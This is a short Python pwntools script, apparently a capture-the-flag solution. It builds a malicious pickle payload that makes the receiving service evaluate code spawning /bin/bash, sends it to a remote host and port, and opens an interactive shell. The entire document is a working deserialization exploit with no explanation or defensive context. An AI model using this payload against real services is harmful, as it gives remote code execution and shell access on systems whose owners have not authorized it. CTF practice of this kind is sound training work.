from pwn import remote, p32

code = b"__import__('os').system('/bin/bash')"
payload = b'X\x08\x00\x00\x00builtinsX\x04\x00\x00\x00evalq\xc3\x93(X' + p32(
	len(code)
) + code + b'tR.'

print(payload)
s = remote("mc.ax", 31773)

s.recvuntil(b": ")
s.sendline(payload)
s.interactive()
